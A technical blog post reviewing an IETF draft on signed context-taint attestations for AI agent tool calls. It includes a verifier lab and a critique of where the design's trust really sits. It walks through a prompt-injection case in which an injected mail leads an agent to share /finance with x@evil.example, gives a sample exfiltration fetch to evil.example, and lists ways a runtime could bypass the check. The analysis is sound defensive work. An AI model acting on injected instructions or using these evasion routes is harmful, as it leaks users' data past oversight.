---
title: "Signing What Was in the Context Window: draft-durga-wimse-ctx-isolation and Its Self-Reported Taint"
published: true
description: "An individual IETF draft wants every AI agent tool call to carry a signed Context Taint Attestation, and wants MCP servers to refuse tainted state-changing calls. I read the five pages, decoded the example, built a verifier, and found where the trust actually sits."
tags: ["ai", "security", "mcp", "identity"]
cover_image: "https://raw.githubusercontent.com/0-draft/dev.to/refs/heads/main/articles/assets/wimse-ctx-isolation-taint-attestation/cover.png?v=536bf14e"
---

The example object in Section 3 of draft-durga-wimse-ctx-isolation-00 has five SHA-256 values in it. I hashed short strings until they matched. `parent_trace_ref` is `sha256("test")`. `system_prompt_digest` is `sha256("4")`. `step_up_receipt_hash` is `sha256("2")`. The `kid` is `sha256("test1")`. And `data_plane_merkle_root`, the field that is supposed to commit to everything the agent had read, is `sha256("")`: the hash of an empty context, sitting next to `"taint_lattice_level": "UNTRUSTED_INGESTED"`.

That tells you what stage this draft is at. The problem it points at is real, though, and the shape it proposes is one somebody will standardize eventually, so it is worth reading closely now.

Full notes, interop checklist and open questions: [identity-deep-dive / draft-durga-wimse-ctx-isolation](https://0-draft.github.io/identity-deep-dive/ietf-wimse/deep-dives/draft-durga-wimse-ctx-isolation/).

## The gap it names

A workload identity token tells a relying party who is calling. An access token tells it what the caller may do. Neither says anything about what the model had just read when it decided to make the call. An agent with a perfectly valid credential that summarizes an inbox, hits a mail saying "share /finance with someone outside", and then calls `files.share` is a confused deputy with a clean token. I wrote about how much such an agent can reach on a laptop in [howbad](https://dev.to/kanywst/howbad-what-a-prompt-injected-coding-agent-could-do-with-the-credentials-on-your-machine-49pd).

The draft's Section 1 states this directly: neither RFC 8693 token exchange nor WIMSE Workload Identity Tokens carry a cryptographic commitment to the taint of the context window at the moment of tool selection. Its answer is to make the agent declare that taint on every tool call, sign it, and let the server refuse.

Status, as of 2026-11-15 on Datatracker: revision 00, posted 2026-10-29, five pages, author from Microsoft. The header says "WIMSE / OAuth Working Group" and "Intended status: Standards Track", but Datatracker lists an individual submission with no stream, no WG state and no intended status. The author announced it on the WIMSE list on 2026-11-01 together with a companion, draft-durga-agenttrust-trace-verification-00, and asked for a five-minute lightning slot at IETF 127 if agenda time remained. No replies on the thread when I checked.

## The object

Here is the Context Taint Attestation (CTA) from Section 3, verbatim:

```json
{
  "cta_version": "1.0",
  "invocation_id": "urn:uuid:7f9c2b10-44a1-49e2-910b-88a12c34e901",
  "parent_trace_ref": "sha256:9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
  "system_prompt_digest": "sha256:4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a",
  "data_plane_merkle_root": "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
  "taint_lattice_level": "UNTRUSTED_INGESTED",
  "tool_effect_class": "STATE_MUTATING",
  "step_up_receipt_hash": "sha256:d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35",
  "iat": 1793404800,
  "exp": 1793404860,
  "signature": {
    "alg": "Ed25519",
    "kid": "sha256:1b4f0e9851971998e732078544c96b36c3d01cedf7caa332359d6f1d83567014",
    "sig": "base64url(Ed25519(JCS(payload)))"
  }
}
```

`iat` is 2026-10-31T00:00:00Z and `exp` is exactly 60 seconds later. The taint levels come from the IANA request in Section 6: `TRUSTED_ONLY`, `MIXED_TAINT`, `UNTRUSTED_INGESTED`, `QUARANTINED`. The effect classes are never enumerated. Only `STATE_MUTATING` and `PRIVILEGED_ACTUATE` appear anywhere in the text.

The interesting question for each field is not what it means but whether any rule reads it. Most don't:

![Field-by-field anatomy of the CTA: field name, the decoded example value, and which MUST rule in Sections 4 and 5 reads it. Only taint level, effect class, receipt hash, iat/exp and the signature are read by a rule; cta_version, invocation_id, parent_trace_ref, system_prompt_digest and the Merkle root are defined but no rule checks them](./assets/wimse-ctx-isolation-taint-attestation/diagrams/02-anatomy.png?v=df9f79f4)

`parent_trace_ref` presumably points into the companion draft's trace records, but neither draft says so, and the companion calls its own link field `parent_record_hash`.

## Where it travels

Section 3: every control-plane tool invocation "emitted by a conforming agent runtime MUST include" the CTA, either in an `Agent-Ctx-Isolation` HTTP header or in a `_meta.ctxIsolation` object for JSON-RPC/MCP. It is serialized with JCS (RFC 8785) or deterministic CBOR (RFC 8949).

The draft has no MCP example. This is what it would look like on a `tools/call`, assuming `_meta` sits in `params` the way MCP already uses it:

```json
{
  "jsonrpc": "2.0",
  "id": 42,
  "method": "tools/call",
  "params": {
    "name": "files.share",
    "arguments": { "path": "/finance", "with": "x@evil.example" },
    "_meta": {
      "ctxIsolation": { "cta_version": "1.0", "taint_lattice_level": "UNTRUSTED_INGESTED", "...": "..." }
    }
  }
}
```

For the HTTP header the draft gives no encoding at all. Raw JCS, base64url of it, or a Structured Field are all plausible, and none of them interoperates with the others, so sender and receiver have to agree out of band. The CTA from my lab is 721 bytes as JCS, so roughly 1 KB per call once encoded.

## The three rules

Section 4 has three invariants, all applied "before any side effect is released":

1. `TAINT_LATTICE_MONOTONICITY`: once the runtime "ingests any byte from an unverified external origin", it MUST move the level from `TRUSTED_ONLY` to `MIXED_TAINT` or `UNTRUSTED_INGESTED`, and it stays there "unless a cryptographic context-reset boundary is executed".
2. `CONFUSED_DEPUTY_FAIL_CLOSED`: if the effect class is `STATE_MUTATING` or `PRIVILEGED_ACTUATE` and the level is not `TRUSTED_ONLY`, the relying party MUST reject with `ERR_TAINTED_CONTROL_PLANE` unless "a valid, unexpired step_up_receipt_hash signed by an independent policy decision engine or human verifier is attached".
3. `CONTEXT_MERKLE_BINDING`: the root MUST be computed over the ordered, JCS-canonicalized chunks of all retrieved documents and tool outputs in the active window.

Section 5 adds: JCS before Ed25519 signing and verification, and fail closed with an auditable rejection receipt on clock skew over 60 seconds, digest mismatch, or a missing cryptographic binding.

Put together, with everything the draft does not define marked:

![Sequence: untrusted mail enters the agent runtime, rule 1 raises the taint level, rule 3 builds the Merkle root, an optional step-up exchange with a policy engine or human (dashed red, no message or receipt format defined), the runtime signs the CTA and sends tools/call with _meta.ctxIsolation, the relying party applies Section 5 checks and rule 2, and either returns ERR_TAINTED_CONTROL_PLANE (no HTTP or JSON-RPC mapping defined) or releases the side effect](./assets/wimse-ctx-isolation-taint-attestation/diagrams/01-flow.png?v=d6f139e6)

Notice which box holds the signing key. Section 3 has the runtime emit the CTA and names no other signer. The thing that decides the taint level is the thing that signs it.

## A verifier, built from the text

I wrote a verifier that follows Sections 3 to 5 as literally as I could and marks every gap I had to fill as an assumption: [cta_lab.py](https://github.com/0-draft/dev.to/blob/main/articles/assets/wimse-ctx-isolation-taint-attestation/lab/cta_lab.py). Python 3.15, `cryptography` 50.0.2.

### What does `JCS(payload)` cover?

The `sig` placeholder is `base64url(Ed25519(JCS(payload)))`. "payload" is not defined. I tried the three readings I'd expect people to pick: drop the `signature` member, keep `signature` with `alg` and `kid` but no `sig`, and keep it with `sig: ""`.

```text
== 3. signing input variants
  signer \ verifier       strip    alg_kid  empty_sig
  strip                     ok       FAIL       FAIL
  alg_kid                 FAIL         ok       FAIL
  empty_sig               FAIL       FAIL         ok
```

Three conforming implementations, zero interop. The Abstract makes it worse: it says the profile is COSE_Sign1 plus JCS, and COSE never appears again in the body. A COSE_Sign1 implementation and a JSON-signature implementation share nothing on the wire.

### What is the Merkle tree?

Rule 3 says "ordered" and "JCS-canonicalized chunks". It does not say how leaves are hashed, how odd nodes are handled, or what a chunk is. Same three chunks, two reasonable trees:

```text
== 2. data_plane_merkle_root over the same three chunks
  RFC 6962 style : sha256:a70d2198da5498e6...
  naive          : sha256:8bcc1cf554ffafe5...
  agree          : False
```

This matters less than it looks, because the relying party never has the chunks, and rule 2 never reads the root. It is an audit commitment: useful later, if someone logged the chunks, and inert at decision time.

### What does rule 2 actually decide?

```text
== 4. relying-party decisions (literal reading of Section 4 rule 2)
  TRUSTED_ONLY        STATE_MUTATING      -> ALLOW
  MIXED_TAINT         STATE_MUTATING      -> REJECT ERR_TAINTED_CONTROL_PLANE
  UNTRUSTED_INGESTED  PRIVILEGED_ACTUATE  -> REJECT ERR_TAINTED_CONTROL_PLANE
  QUARANTINED         STATE_MUTATING      -> REJECT ERR_TAINTED_CONTROL_PLANE
  QUARANTINED         READ_ONLY           -> ALLOW
  UNTRUSTED_INGESTED  NETWORK_EGRESS      -> ALLOW
  UNTRUSTED_INGESTED  STATE_MUTATING      -> ALLOW (step-up receipt)  [receipt attached]
  same CTA, 61 s later                    -> REJECT clock skew / expired
```

`READ_ONLY` and `NETWORK_EGRESS` are my names; the draft defines neither, which is the point. The full matrix:

![Decision table for rule 2 without a step-up receipt: rows are taint levels TRUSTED_ONLY, MIXED_TAINT, UNTRUSTED_INGESTED, QUARANTINED and a lying runtime that claims TRUSTED_ONLY; columns are STATE_MUTATING, PRIVILEGED_ACTUATE and any other effect class. Tainted mutating and privileged calls are rejected; every other effect class is allowed at every taint level, including a GET to an attacker URL; the lying runtime row is allowed everywhere because its signature is valid](./assets/wimse-ctx-isolation-taint-attestation/diagrams/03-decision.png?v=8d456576)

Two cells bother me.

The right column. Rule 2 guards state mutation. Exfiltration doesn't need state mutation: a `fetch_url("https://evil.example/?q=<the secret>")` is a read, as far as any effect taxonomy is concerned. In Simon Willison's lethal trifecta (private data, untrusted content, an outbound channel, which I leaned on in [trust-me-bro](https://dev.to/kanywst/trust-me-bro-reading-an-agent-skill-before-it-reads-your-env-329d)) the CTA can see the second leg and blocks a write, but the third leg passes through any effect class nobody listed.

`QUARANTINED` is registered in Section 6 and used by no rule. It gets rejected for mutating calls only because it isn't `TRUSTED_ONLY`, and it means nothing for anything else.

### The bottom row

```text
== 5. runtime with the injected mail in context signs TRUSTED_ONLY
  verifier says: ALLOW
```

This is the whole design question. The runtime that read the injected mail is the runtime that decides the taint level and holds the key. If it is compromised, buggy, or simply a runtime that never implemented rule 1, it signs `TRUSTED_ONLY` and the relying party sees a valid signature. The signature proves who made the claim, not that the claim is true. The Merkle root in my lying CTA is non-empty, which an auditor could notice later if the chunks were kept, but nothing at the gate can.

So in revision 00 the CTA is a signed self-report. It still has value against one specific failure: an honest runtime with a manipulated model. Taint tracking lives in the harness, not in the model's weights, and an injected instruction can't talk the harness out of having fetched a URL. That is a real improvement over trusting the model. It does nothing about a malicious or vulnerable runtime, and the draft does not say which of the two it is defending against.

### Smaller things the verifier had to guess

- Which field the 60-second skew is measured on. I used `|now - iat|`. If an implementation measures against `exp`, a CTA with the example's 60-second lifetime sits on the boundary from birth.
- Replay. The words "replay" and "nonce" do not appear. `invocation_id` exists, but nothing says a relying party must remember it, so the same CTA works for 60 seconds.
- `kid`. No derivation, no distribution, no binding to a WIMSE identity. I used `sha256` of the raw public key, which is a guess.
- The step-up receipt. The CTA carries a hash; Section 6 registers an `Agent-Step-Up-Receipt` header; nothing links the two or defines the receipt. My receipt binds to `invocation_id`, but even so it doesn't bind to the tool arguments, so an approval for `share /q3-deck with alice` also covers `share /finance with x@evil.example` under the same invocation id. "Independent" isn't defined either; a receipt signed by the runtime's own key passes unless the verifier knows otherwise.
- No HTTP status or JSON-RPC error code for `ERR_TAINTED_CONTROL_PLANE`.
- Section 3 allows deterministic CBOR; Section 5 requires JCS before signing. A CBOR CTA has no defined verification path.

Cost isn't the problem. On my laptop: sign 40.8 µs, verify 107.3 µs, averaged over 5000 runs.

## Smaller inconsistencies

- Normative references (Section 7) list only RFC 2119, 8174, 8785 and 8032. RFC 8949, RFC 8693, COSE, the WIMSE tokens and the companion draft are all cited in the text and missing from the list.
- The mailing-list announcement asks for feedback on "the ctx_isolation_witness structure and Policy-Epoch AST binding (policy_manifest_sha256)". Neither name appears in revision 00 of this draft or of the companion. The mail also points to a 100-row benchmark dataset (DOI 10.57967/hf/11352) that neither draft cites.
- A2A is mentioned once, in the Abstract, and never again.
- Nothing composes the CTA with the WIT or WPT the Abstract names. A CTA is not bound to the workload's identity key, so a relying party can't tell that the attestation and the token came from the same workload.

## If I had to ship this tomorrow

The idea that a tool server should know the taint of the context that produced a call is right, and I'd rather have a shared wire format for it than every MCP gateway inventing one. If I implemented -00 today, these are the choices I'd write down, because the draft doesn't:

| Gap | What I'd pick | Why |
| --- | --- | --- |
| Signing input | JCS of the object without `signature` | Simplest; no self-referential field inside the signed bytes |
| Merkle tree | RFC 6962 leaf/node prefixes | Domain separation; known proofs if anyone ever wants inclusion checks |
| Unknown effect class | Treat as `STATE_MUTATING` | Fail closed is the draft's own stated posture |
| Egress | A separate guarded class for anything that sends data out | Closes the right-hand column above |
| Who computes taint | The gateway that brokered the fetch, not the agent process | The component that saw the bytes arrive should sign, and it should not share a key with the model's harness |
| Receipt | Signed object over `invocation_id`, tool name, hash of arguments, `exp`, approver key | Otherwise an approval is a blank cheque for the invocation |
| Replay | Cache `invocation_id` until `exp` | Cheap with a 60-second window |
| Identity | Sign with the WIMSE workload key, or carry the CTA inside a WPT | Ties the claim to the same workload the token authenticates |

The row I'd argue about on the list is "who computes taint". As long as the signer is the agent runtime, the CTA moves trust from the model to the harness, which is worth something, and stops there. A design where the egress proxy or the MCP host labels what came in, and the relying party checks that label rather than the agent's account of it, is the version that would survive a compromised runtime. Revision 00 doesn't go there. A -01 that answers that one question would be worth more than any amount of additional fields.

Related: [WIMSE deep dive](https://dev.to/kanywst/wimse-workload-identity-in-multi-system-environments-deep-dive-standardizing-identity-5a12) for the WIT/WPT this draft wants to sit beside, and [the three layers of AI agent auth](https://dev.to/kanywst/the-three-layers-of-ai-agent-authentication-what-id-jag-transaction-tokens-and-wif-actually-1mbk) for where identity tokens stop and this kind of context evidence would have to start.
